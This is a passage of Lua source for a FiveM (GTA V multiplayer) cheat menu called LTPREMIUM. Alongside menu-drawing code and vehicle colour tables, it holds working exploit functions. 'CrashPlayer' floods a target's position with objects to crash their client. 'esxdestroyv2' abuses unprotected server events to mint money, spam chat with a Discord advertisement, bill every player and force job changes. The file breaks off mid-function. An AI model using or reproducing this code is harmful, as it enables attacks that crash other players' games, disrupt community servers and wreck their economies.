    menus[id].menuFocusBackgroundColor = { r = 80, g = 80, b = 80, a = 200 } -- Тъмно сиво с прозрачен ефект
    menus[id].menuBackgroundColor = { r = 40, g = 40, b = 40, a = 230 } -- Тъмно сиво за фона

    -- Фон на подзаглавията
    menus[id].subTitleBackgroundColor = { r = 60, g = 60, b = 60, a = 200 } -- Средно сиво за подзаглавията

    -- Звук при натискане на бутон
    menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" }

    menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" }

    debugPrint(tostring(id).." menu created")
end


function LTPREMIUM.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        LTPREMIUM.CreateMenu(id, menus[parent].title)

        if subTitle then
            setMenuProperty(id, "subTitle", string.upper(subTitle))
        else
            setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
        end

        setMenuProperty(id, "previousMenu", parent)

        setMenuProperty(id, "x", menus[parent].x)
        setMenuProperty(id, "y", menus[parent].y)
        setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
        setMenuProperty(id, "titleFont", menus[parent].titleFont)
        setMenuProperty(id, "titleColor", menus[parent].titleColor)
        setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
        setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
        setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
        setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
        setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
        setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
        setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
        setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
    else
        debugPrint("Failed to create "..tostring(id).." submenu: "..tostring(parent).." parent menu doesn\"t exist")
    end
end


function LTPREMIUM.CurrentMenu()
    return currentMenu
end


function trynaskidhuh(id)
    if id and menus[id] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        setMenuVisible(id, true)
        debugPrint(tostring(id).." menu opened")
    else
        debugPrint("Failed to open "..tostring(id).." menu: it doesn\"t exist")
    end
end


function LTPREMIUM.IsMenuOpened(id)
    return isMenuVisible(id)
end


Citizen.CreateThread(function()
    while true do
        Citizen.Wait(-1000) -- Постоянно обновява менюто, за да избегне премигване
        if LTPREMIUM.IsAnyMenuOpened() then -- Проверява дали някое меню е активно
            LTPREMIUM.Display()
        end
    end
end)


function LTPREMIUM.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
        return menus[currentMenu].aboutToBeClosed
    else
        return false
    end
end


function LTPREMIUM.CloseMenu()
    if menus[currentMenu] then
        if menus[currentMenu].aboutToBeClosed then
            menus[currentMenu].aboutToBeClosed = false
            setMenuVisible(currentMenu, false)
            debugPrint(tostring(currentMenu).." menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            optionCount = 0
            currentMenu = nil
            currentKey = nil
        else
            menus[currentMenu].aboutToBeClosed = true
            debugPrint(tostring(currentMenu).." menu about to be closed")
        end
    end
end


function LTPREMIUM.Button(text, subText)
    local buttonText = text
    if subText then
        buttonText = "{ "..tostring(buttonText)..", "..tostring(subText).." }"
    end

    if menus[currentMenu] then
        optionCount = optionCount + 1

        local isCurrent = menus[currentMenu].currentOption == optionCount

        drawButton(text, subText)

        if isCurrent then
            if currentKey == keys.select then
                PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
                debugPrint(buttonText.." button pressed")
                return true
            elseif currentKey == keys.left or currentKey == keys.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end

        return false
    else
        debugPrint("Failed to create "..buttonText.." button: "..tostring(currentMenu).." menu doesn\"t exist")

        return false
    end
end


function LTPREMIUM.MenuButton(text, id)
    if menus[id] then
        if LTPREMIUM.Button(text) then
            setMenuVisible(currentMenu, false)
            setMenuVisible(id, true, true)

            return true
        end
    else
        debugPrint("Failed to create "..tostring(text).." menu button: "..tostring(id).." submenu doesn\"t exist")
    end

    return false
end

local bm = {
    {
        name = "~h~~r~Engine",
        id = 11
    },
    {
        name = "~h~~b~Brakes",
        id = 12
    },
    {
        name = "~h~~g~Transmission",
        id = 13
    },
    {
        name = "~h~~y~Suspension",
        id = 15
    },
    {
        name = "~h~~b~Armor",
        id = 16
    }
}

function LTPREMIUM.CheckBox(text, checked, callback)
    if LTPREMIUM.Button(text, checked and "~g~~h~On" or "~h~~c~Off") then
        checked = not checked
        debugPrint(tostring(text).." checkbox changed to "..tostring(checked))
        if callback then callback(checked) end

        return true
    end

    return false
end


function LTPREMIUM.ComboBox(text, items, currentIndex, selectedIndex, callback)
    local itemsCount = #items
    local selectedItem = items[currentIndex]
    local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

    if itemsCount > 1 and isCurrent then
        selectedItem = "← "..tostring(selectedItem).." →"
    end

    if LTPREMIUM.Button(text, selectedItem) then
        selectedIndex = currentIndex
        callback(currentIndex, selectedIndex)
        return true
    elseif isCurrent then
        if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
        elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
        end
    else
        currentIndex = selectedIndex
    end

    callback(currentIndex, selectedIndex)
    return false
end

function LTPREMIUM.Display()
    if isMenuVisible(currentMenu) then
        if menus[currentMenu].aboutToBeClosed then
            LTPREMIUM.CloseMenu()
        else
            ClearAllHelpMessages()

            drawTitle()
            drawSubTitle()

            currentKey = nil

            if IsControlJustReleased(1, keys.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if menus[currentMenu].currentOption < optionCount then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
                else
                    menus[currentMenu].currentOption = 1
                end
            elseif IsControlJustReleased(1, keys.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if menus[currentMenu].currentOption > 1 then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
                else
                    menus[currentMenu].currentOption = optionCount
                end
            elseif IsControlJustReleased(1, keys.left) then
                currentKey = keys.left
            elseif IsControlJustReleased(1, keys.right) then
                currentKey = keys.right
            elseif IsControlJustReleased(1, keys.select) then
                currentKey = keys.select
            elseif IsControlJustReleased(1, keys.back) then
                if menus[menus[currentMenu].previousMenu] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    setMenuVisible(menus[currentMenu].previousMenu, true)
                else
                    LTPREMIUM.CloseMenu()
                end
            end

            optionCount = 0
        end
    end
end


function LTPREMIUM.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function LTPREMIUM.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function LTPREMIUM.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function LTPREMIUM.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function LTPREMIUM.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function LTPREMIUM.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function LTPREMIUM.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function LTPREMIUM.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function LTPREMIUM.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function LTPREMIUM.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function LTPREMIUM.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function LTPREMIUM.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function LTPREMIUM.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function LTPREMIUM.SetMenuButtonPressedSound(id, name, set)
    setMenuProperty(id, "buttonPressedSound", { ["name"] = name, ["set"] = set })
end

function drawNotification(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(false, false)
end


function getEntity(player)
    local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
    return entity
end

local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(u)
    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
 end

 local bn = {
    {
        name = "~h~Blue on White 2",
        id = 0
    },
    {
        name = "~h~Blue on White 3",
        id = 4
    },
    {
        name = "~h~Yellow on Blue",
        id = 2
    },
    {
        name = "~h~Yellow on Black",
        id = 1
    },
    {
        name = "~h~North Yankton",
        id = 5
    }
}

local bp = {
    ["Stock Horn"] = -1,
    ["Truck Horn"] = 1,
    ["Police Horn"] = 2,
    ["Clown Horn"] = 3,
    ["Musical Horn 1"] = 4,
    ["Musical Horn 2"] = 5,
    ["Musical Horn 3"] = 6,
    ["Musical Horn 4"] = 7,
    ["Musical Horn 5"] = 8,
    ["Sad Trombone Horn"] = 9,
    ["Classical Horn 1"] = 10,
    ["Classical Horn 2"] = 11,
    ["Classical Horn 3"] = 12,
    ["Classical Horn 4"] = 13,
    ["Classical Horn 5"] = 14,
    ["Classical Horn 6"] = 15,
    ["Classical Horn 7"] = 16,
    ["Scaledo Horn"] = 17,
    ["Scalere Horn"] = 18,
    ["Salemi Horn"] = 19,
    ["Scalefa Horn"] = 20,
    ["Scalesol Horn"] = 21,
    ["Scalela Horn"] = 22,
    ["Scaleti Horn"] = 23,
    ["Scaledo Horn High"] = 24,
    ["Jazz Horn 1"] = 25,
    ["Jazz Horn 2"] = 26,
    ["Jazz Horn 3"] = 27,
    ["Jazz Loop Horn"] = 28,
    ["Starspangban Horn 1"] = 28,
    ["Starspangban Horn 2"] = 29,
    ["Starspangban Horn 3"] = 30,
    ["Starspangban Horn 4"] = 31,
    ["Classical Loop 1"] = 32,
    ["Classical Horn 8"] = 33,
    ["Classical Loop 2"] = 34
}
local bq = {
    ["White"] = {
        255,
        255,
        255
    },
    ["Blue"] = {
        0,
        0,
        255
    },
    ["Electric Blue"] = {
        0,
        150,
        255
    },
    ["Mint Green"] = {
        50,
        255,
        155
    },
    ["Lime Green"] = {
        0,
        255,
        0
    },
    ["Yellow"] = {
        255,
        255,
        0
    },
    ["Golden Shower"] = {
        204,
        204,
        0
    },
    ["Orange"] = {
        255,
        128,
        0
    },
    ["Red"] = {
        255,
        0,
        0
    },
    ["Pony Pink"] = {
        255,
        102,
        255
    },
    ["Hot Pink"] = {
        255,
        0,
        255
    },
    ["Purple"] = {
        153,
        0,
        153
    }
}


local br = {
    {
        name = "~h~Black",
        id = 0
    },
    {
        name = "~h~Carbon Black",
        id = 147
    },
    {
        name = "~h~Graphite",
        id = 1
    },
    {
        name = "~h~Anhracite Black",
        id = 11
    },
    {
        name = "~h~Black Steel",
        id = 2
    },
    {
        name = "~h~Dark Steel",
        id = 3
    },
    {
        name = "~h~Silver",
        id = 4
    },
    {
        name = "~h~Bluish Silver",
        id = 5
    },
    {
        name = "~h~Rolled Steel",
        id = 6
    },
    {
        name = "~h~Shadow Silver",
        id = 7
    },
    {
        name = "~h~Stone Silver",
        id = 8
    },
    {
        name = "~h~Midnight Silver",
        id = 9
    },
    {
        name = "~h~Cast Iron Silver",
        id = 10
    },
    {
        name = "~h~Red",
        id = 27
    },
    {
        name = "~h~Torino Red",
        id = 28
    },
    {
        name = "~h~Formula Red",
        id = 29
    },
    {
        name = "~h~Lava Red",
        id = 150
    },
    {
        name = "~h~Blaze Red",
        id = 30
    },
    {
        name = "~h~Grace Red",
        id = 31
    },
    {
        name = "~h~Garnet Red",
        id = 32
    },
    {
        name = "~h~Sunset Red",
        id = 33
    },
    {
        name = "~h~Cabernet Red",
        id = 34
    },
    {
        name = "~h~Wine Red",
        id = 143
    },
    {
        name = "~h~Candy Red",
        id = 35
    },
    {
        name = "~h~Hot Pink",
        id = 135
    },
    {
        name = "~h~Pfsiter Pink",
        id = 137
    },
    {
        name = "~h~Salmon Pink",
        id = 136
    },
    {
        name = "~h~Sunrise Orange",
        id = 36
    },
    {
        name = "~h~Orange",
        id = 38
    },
    {
        name = "~h~Bright Orange",
        id = 138
    },
    {
        name = "~h~Gold",
        id = 99
    },
    {
        name = "~h~Bronze",
        id = 90
    },
    {
        name = "~h~Yellow",
        id = 88
    },
    {
        name = "~h~Race Yellow",
        id = 89
    },
    {
        name = "~h~Dew Yellow",
        id = 91
    },
    {
        name = "~h~Dark Green",
        id = 49
    },
    {
        name = "~h~Racing Green",
        id = 50
    },
    {
        name = "~h~Sea Green",
        id = 51
    },
    {
        name = "~h~Olive Green",
        id = 52
    },
    {
        name = "~h~Bright Green",
        id = 53
    },
    {
        name = "~h~Gasoline Green",
        id = 54
    },
    {
        name = "~h~Lime Green",
        id = 92
    },
    {
        name = "~h~Midnight Blue",
        id = 141
    },
    {
        name = "~h~Galaxy Blue",
        id = 61
    },
    {
        name = "~h~Dark Blue",
        id = 62
    },
    {
        name = "~h~Saxon Blue",
        id = 63
    },
    {
        name = "~h~Blue",
        id = 64
    },
    {
        name = "~h~Mariner Blue",
        id = 65
    },
    {
        name = "~h~Harbor Blue",
        id = 66
    },
    {
        name = "~h~Diamond Blue",
        id = 67
    },
    {
        name = "~h~Surf Blue",
        id = 68
    },
    {
        name = "~h~Nautical Blue",
        id = 69
    },
    {
        name = "~h~Racing Blue",
        id = 73
    },
    {
        name = "~h~Ultra Blue",
        id = 70
    },
    {
        name = "~h~Light Blue",
        id = 74
    },
    {
        name = "~h~Chocolate Brown",
        id = 96
    },
    {
        name = "~h~Bison Brown",
        id = 101
    },
    {
        name = "~h~Creeen Brown",
        id = 95
    },
    {
        name = "~h~Feltzer Brown",
        id = 94
    },
    {
        name = "~h~Maple Brown",
        id = 97
    },
    {
        name = "~h~Beechwood Brown",
        id = 103
    },
    {
        name = "~h~Sienna Brown",
        id = 104
    },
    {
        name = "~h~Saddle Brown",
        id = 98
    },
    {
        name = "~h~Moss Brown",
        id = 100
    },
    {
        name = "~h~Woodbeech Brown",
        id = 102
    },
    {
        name = "~h~Straw Brown",
        id = 99
    },
    {
        name = "~h~Sandy Brown",
        id = 105
    },
    {
        name = "~h~Bleached Brown",
        id = 106
    },
    {
        name = "~h~Schafter Purple",
        id = 71
    },
    {
        name = "~h~Spinnaker Purple",
        id = 72
    },
    {
        name = "~h~Midnight Purple",
        id = 142
    },
    {
        name = "~h~Bright Purple",
        id = 145
    },
    {
        name = "~h~Cream",
        id = 107
    },
    {
        name = "~h~Ice White",
        id = 111
    },
    {
        name = "~h~Frost White",
        id = 112
    }
}
local bt = {
    {
        name = "~h~Black",
        id = 12
    },
    {
        name = "~h~Gray",
        id = 13
    },
    {
        name = "~h~Light Gray",
        id = 14
    },
    {
        name = "~h~Ice White",
        id = 131
    },
    {
        name = "~h~Blue",
        id = 83
    },
    {
        name = "~h~Dark Blue",
        id = 82
    },
    {
        name = "~h~Midnight Blue",
        id = 84
    },
    {
        name = "~h~Midnight Purple",
        id = 149
    },
    {
        name = "~h~Schafter Purple",
        id = 148
    },
    {
        name = "~h~Red",
        id = 39
    },
    {
        name = "~h~Dark Red",
        id = 40
    },
    {
        name = "~h~Orange",
        id = 41
    },
    {
        name = "~h~Yellow",
        id = 42
    },
    {
        name = "~h~Lime Green",
        id = 55
    },
    {
        name = "~h~Green",
        id = 128
    },
    {
        name = "~h~Forest Green",
        id = 151
    },
    {
        name = "~h~Foliage Green",
        id = 155
    },
    {
        name = "~h~Olive Darb",
        id = 152
    },
    {
        name = "~h~Dark Earth",
        id = 153
    },
    {
        name = "~h~Desert Tan",
        id = 154
    }
}
local bu = {
    {
        name = "~h~Brushed Steel",
        id = 117
    },
    {
        name = "~h~Brushed Black Steel",
        id = 118
    },
    {
        name = "~h~Brushed Aluminum",
        id = 119
    },
    {
        name = "~h~Pure Gold",
        id = 158
    },
    {
        name = "~h~Brushed Gold",
        id = 159
    }
}
 

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function MaxOutPerf(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
end

function CrashPlayer(ped)
    local playerPos = GetEntityCoords(ped, false)
    local modelHashes = {
        0x34315488,
        0x6A27FEB1, 0xCB2ACC8,
        0xC6899CDE, 0xD14B5BA3,
        0xD9F4474C, 0x32A9996C,
        0x69D4F974, 0xCAFC1EC3,
        0x79B41171, 0x1075651,
        0xC07792D4, 0x781E451D,
        0x762657C6, 0xC2E75A21,
        0xC3C00861, 0x81FB3FF0,
        0x45EF7804, 0xE65EC0E4,
        0xE764D794, 0xFBF7D21F,
        0xE1AEB708, 0xA5E3D471,
        0xD971BBAE, 0xCF7A9A9D,
        0xC2CC99D8, 0x8FB233A4,
        0x24E08E1F, 0x337B2B54,
        0xB9402F87, 0x4F2526DA
    }

    for i = 1, #modelHashes do
        obj = CreateObject(modelHashes[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
    end
end

capPa = 'd' .. 'o' .. 'k' .. 'i'
cappA = 'd' .. 'o' .. 'k' .. 'i' .. capPa
local bD = cappA

function esxdestroyv2()
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
                        TriggerServerEvent('esx_carthief:pay', 9999999999)
                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
                        TriggerServerEvent('esx_pizza:pay', 9999999999)
                        TriggerServerEvent('esx_ranger:pay', 9999999999)
                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '~g~LTMENU#7799',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. '~b~LTMENU'
                            )
                        end
                        for i = 0, 256 do
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx_billing:sendBill',
                                GetPlayerServerId(i),
                                'Purposeless',
                                '~g~Join LT Discord for more menus!',
                                43161337
                            )
                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
                            TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
                        end
                    end
                )
end

function ch(C,x,y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(C)
    DrawText(x,y)
end

local function getPlayerIds()
    local players = {}
    for i = -1, 128 do
        if NetworkIsPlayerActive(i) then
            players[#players + 1] = i
        end
    end
    return players
end

function DrawText3D(x, y, z, text, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

local RCCar = {}

-- LTPREMIUM

RCCar.Start = function()
	if DoesEntityExist(RCCar.Entity) then return end

	RCCar.Spawn()

	RCCar.Tablet(true)

	while DoesEntityExist(RCCar.Entity) and DoesEntityExist(RCCar.Driver) do
		Citizen.Wait(-1000)

		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(RCCar.Entity), true)

		RCCar.DrawInstructions(distanceCheck)
		RCCar.HandleKeys(distanceCheck)

		if distanceCheck <= 10000000.0 then
			if not NetworkHasControlOfEntity(RCCar.Driver) then
				NetworkRequestControlOfEntity(RCCar.Driver)
			elseif not NetworkHasControlOfEntity(RCCar.Entity) then
				NetworkRequestControlOfEntity(RCCar.Entity)
			end
		else
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
		end
	end
end

RCCar.HandleKeys = function(distanceCheck)
	if IsControlJustReleased(0, 47) then
		if IsCamRendering(RCCar.Camera) then
			RCCar.ToggleCamera(false)
		else
			RCCar.ToggleCamera(true)
		end
	end

	if distanceCheck <= 10000000.0 then
		if IsControlJustPressed(0, 73) then
			RCCar.Attach("pick")
		end
	end

	if distanceCheck < 10000000.0 then
	    if IsControlJustReleased(0, 108) then
		    local coos = GetEntityCoords(RCCar.Entity, true)
            AddExplosion(coos.x, coos.y, coos.z, 2, 100000.0, true, false, 0)
		end
		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
